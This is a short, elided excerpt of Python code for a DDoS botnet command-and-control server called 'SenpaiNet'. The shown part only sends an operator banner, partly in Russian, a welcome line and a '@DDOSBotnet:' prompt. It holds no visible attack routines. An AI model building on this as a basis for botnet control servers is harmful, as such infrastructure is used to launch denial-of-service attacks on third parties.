...
def Commander(sock,rlock):#cnc server
	...
	sock.send("[!]    ********************************\r\n".encode())
	time.sleep(0.5)
	sock.send("[!]   *       SenpaiNet by Senpai      *\r\n".encode())
	time.sleep(0.5)
	sock.send("[!]   *         командир здесь         *\r\n".encode())
	time.sleep(0.5)
	sock.send("[!]   *Не сообщайте свои учетные данные*\r\n".encode())
	time.sleep(0.5)
	sock.send("[!]   * C&C сервер полностью настроен  *\r\n".encode())
	time.sleep(0.5)
	sock.send("[!]   *    готов к работе в системе    *\r\n".encode())
	time.sleep(0.5)
	sock.send("[!]   *           Веселитесь           *\r\n".encode())
	time.sleep(0.5)
	sock.send("[!]    ********************************\r\n".encode())
	time.sleep(0.5)               
	sock.send(("[!] Welcom to the Senpai C&C Server, "+str(name.strip("\r\n"))+"\r\n").encode())
	sock.send("==============================================\r\n".encode())
	time.sleep(1)
	...
	while True:
		...
		sock.send((str(name)+'@DDOSBotnet:').encode())#if u run this on windows, it may has some bug, idk why.
